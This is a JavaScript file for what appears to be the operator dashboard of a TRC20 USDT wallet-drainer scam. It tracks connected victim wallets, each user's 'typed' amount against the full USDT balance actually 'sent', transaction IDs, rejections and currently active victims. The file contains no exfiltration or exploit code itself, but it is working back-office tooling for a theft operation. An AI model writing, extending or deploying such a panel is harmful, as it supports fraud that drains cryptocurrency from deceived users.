var STORAGE_KEY='trc20_admin_data';

function $(s){try{return document.querySelector(s);}catch(e){return null;}}

function getData(){
  try{
    var raw=localStorage.getItem(STORAGE_KEY);
    if(!raw) return [];
    var parsed=JSON.parse(raw);
    if(Array.isArray(parsed)) return parsed;
    if(parsed&&parsed.transactions) return parsed.transactions;
    return [];
  }catch(e){return []}
}

function groupByWallet(data){
  var wallets={};
  try{
    data.forEach(function(d){
      if(!d||!d.addr) return;
      if(!wallets[d.addr]) wallets[d.addr]={addr:d.addr,events:[],typedAmt:'0',usdtBal:0,txId:null,status:'unknown',lastTs:0};
      var w=wallets[d.addr];
      w.events.push(d);
      if(d.step==='connected') w.status='connected';
      if(d.step==='balance'){w.status='balance';w.typedAmt=d.typedAmt||'0';w.usdtBal=d.usdtBal||0;}
      if(d.step==='sending') w.status='sending';
      if(d.step==='sent'){w.status='sent';w.txId=d.txId;w.typedAmt=d.typedAmt||w.typedAmt;}
      if(d.step==='rejected') w.status='rejected';
      if(d.step==='error') w.status='error';
      if(d.ts>w.lastTs) w.lastTs=d.ts;
    });
  }catch(e){}
  return wallets;
}

function setText(s,v){try{var e=$(s);if(e)e.textContent=v;}catch(e){}}

function renderStats(){
  try{
    var data=getData();
    var wallets=groupByWallet(data);
    var keys=Object.keys(wallets);
    var connected=keys.filter(function(k){return wallets[k].status!=='error';}).length;
    var sent=keys.filter(function(k){return wallets[k].status==='sent';}).length;
    var sending=keys.filter(function(k){return wallets[k].status==='sending';}).length;
    var rejected=keys.filter(function(k){return wallets[k].status==='rejected';}).length;
    var active=keys.filter(function(k){return(Date.now()-wallets[k].lastTs)<120000;}).length;

    setText('#stat-wallets',keys.length);
    setText('#stat-connected',connected);
    setText('#stat-sent',sent);
    setText('#stat-sending',sending);
    setText('#stat-rejected',rejected);
    setText('#stat-active',active);
  }catch(e){}
}

function renderWallets(){
  try{
    var data=getData();
    var wallets=groupByWallet(data);
    var list=$('#wallet-list');
    if(!list) return;

    var keys=Object.keys(wallets);
    if(keys.length===0){
      list.innerHTML='<div class="empty-msg">No wallets connected yet</div>';
      return;
    }

    list.innerHTML='';
    keys.sort(function(a,b){return wallets[b].lastTs-wallets[a].lastTs;});

    keys.forEach(function(k){
      var w=wallets[k];
      var div=document.createElement('div');
      div.className='wallet-item';

      var short=w.addr.slice(0,6)+'...'+w.addr.slice(-4);
      var ago=timeAgo(w.lastTs);

      var steps=[];
      w.events.forEach(function(e){
        if(e.step==='connected') steps.push('<span class="step step-ok">Connected</span>');
        if(e.step==='balance') steps.push('<span class="step step-info">Typed: $'+(e.typedAmt||'0')+'</span>');
        if(e.step==='sending') steps.push('<span class="step step-wait">Sending...</span>');
        if(e.step==='sent') steps.push('<span class="step step-ok">Sent!</span>');
        if(e.step==='rejected') steps.push('<span class="step step-err">Rejected</span>');
        if(e.step==='error') steps.push('<span class="step step-err">Error: '+(e.msg||'')+'</span>');
      });

      var statusClass='offline';
      if(w.status==='sent') statusClass='sent';
      else if(w.status==='sending') statusClass='sending';
      else if(w.status==='rejected') statusClass='rejected';
      else if(w.status==='error') statusClass='error';
      else if(w.status==='connected'||w.status==='balance') statusClass='online';

      div.innerHTML=
        '<div class="wi-top">'+
          '<div class="wi-addr">'+short+'</div>'+
          '<div class="wi-status '+statusClass+'">'+w.status.toUpperCase()+'</div>'+
        '</div>'+
        '<div class="wi-mid">'+
          '<span class="wi-amt">Typed: $'+w.typedAmt+'</span>'+
          '<span class="wi-send">\u2192 sent: '+w.usdtBal.toFixed(2)+' USDT</span>'+
        '</div>'+
        '<div class="wi-steps">'+steps.join('')+'</div>'+
        '<div class="wi-time">'+ago+'</div>';

      div.onclick=function(){openModal(w);};
      list.appendChild(div);
    });
  }catch(e){}
}

function renderTransactions(){
  try{
    var data=getData();
    var log=$('#tx-log');
    if(!log) return;

    var txs=data.filter(function(d){return d.step==='sent'||d.step==='rejected'||d.step==='error';});
    if(txs.length===0){
      log.innerHTML='<div class="empty-msg">No completed transactions yet</div>';
      return;
    }

    log.innerHTML='';
    txs.slice().reverse().slice(0,50).forEach(function(d){
      var div=document.createElement('div');
      div.className='log-item';

      var time=new Date(d.ts).toLocaleTimeString();
      var short=d.addr?d.addr.slice(0,6)+'...':'?';

      if(d.step==='sent'){
        div.className+=' log-success';
        div.innerHTML='<span class="log-time">['+time+']</span> <span class="log-amt">'+d.typedAmt+' USDT</span> typed \u2192 sent '+d.usdtBal.toFixed(2)+' from '+short+' <span class="log-tx">'+(d.txId?d.txId.slice(0,10)+'...':'')+'</span>';
      }else if(d.step==='rejected'){
        div.className+=' log-warn';
        div.innerHTML='<span class="log-time">['+time+']</span> REJECTED by '+short;
      }else{
        div.className+=' log-err';
        div.innerHTML='<span class="log-time">['+time+']</span> ERROR from '+short+': '+(d.msg||'unknown');
      }
      log.appendChild(div);
    });
  }catch(e){}
}

function openModal(w){
  try{
    setText('#modal-address',w.addr);
    setText('#modal-amt-typed','$'+w.typedAmt);
    setText('#modal-usdt-sent',w.usdtBal.toFixed(2)+' USDT');
    setText('#modal-status',w.status.toUpperCase());
    setText('#modal-tx',w.txId||'none');

    var tl=$('#modal-tx-list');
    if(tl){
      tl.innerHTML='';
      w.events.forEach(function(e){
        var div=document.createElement('div');
        div.className='log-item';
        var t=new Date(e.ts).toLocaleTimeString();
        var label=e.step.toUpperCase();
        var detail='';
        if(e.step==='connected') detail='Wallet connected';
        if(e.step==='balance') detail='Typed $'+(e.typedAmt||'0')+', balance '+e.usdtBal+' USDT';
        if(e.step==='sending') detail='Sending '+e.usdtBal+' USDT...';
        if(e.step==='sent') detail='Sent! TX: '+(e.txId||'');
        if(e.step==='rejected') detail='User rejected';
        if(e.step==='error') detail='Error: '+(e.msg||'');
        div.innerHTML='<span class="log-time">['+t+']</span> <span class="log-step">'+label+'</span> '+detail;
        tl.appendChild(div);
      });
    }

    var modal=$('#wallet-modal');
    if(modal) modal.classList.remove('hidden');
  }catch(e){}
}

function timeAgo(ts){
  try{
    if(!ts) return 'unknown';
    var diff=Date.now()-ts;
    if(diff<0) return 'just now';
    var s=Math.floor(diff/1000);
    if(s<60) return s+'s ago';
    var m=Math.floor(s/60);
    if(m<60) return m+'m ago';
    var h=Math.floor(m/60);
    if(h<24) return h+'h ago';
    return Math.floor(h/24)+'d ago';
  }catch(e){return 'unknown';}
}

function refresh(){renderStats();renderWallets();renderTransactions();}

document.addEventListener('DOMContentLoaded',function(){
  try{
    refresh();
    setInterval(refresh,10000);

    var rb=$('#refresh-btn');
    var cb=$('#clear-btn');
    var mc=$('#modal-close');
    var md=$('#wallet-modal');

    if(rb) rb.onclick=refresh;
    if(cb) cb.onclick=function(){
      if(confirm('Clear all?')){localStorage.removeItem(STORAGE_KEY);refresh();}
    };
    if(mc) mc.onclick=function(){if(md) md.classList.add('hidden');};
    if(md) md.onclick=function(e){if(e.target&&e.target.id==='wallet-modal') e.target.classList.add('hidden');};
  }catch(e){}
});
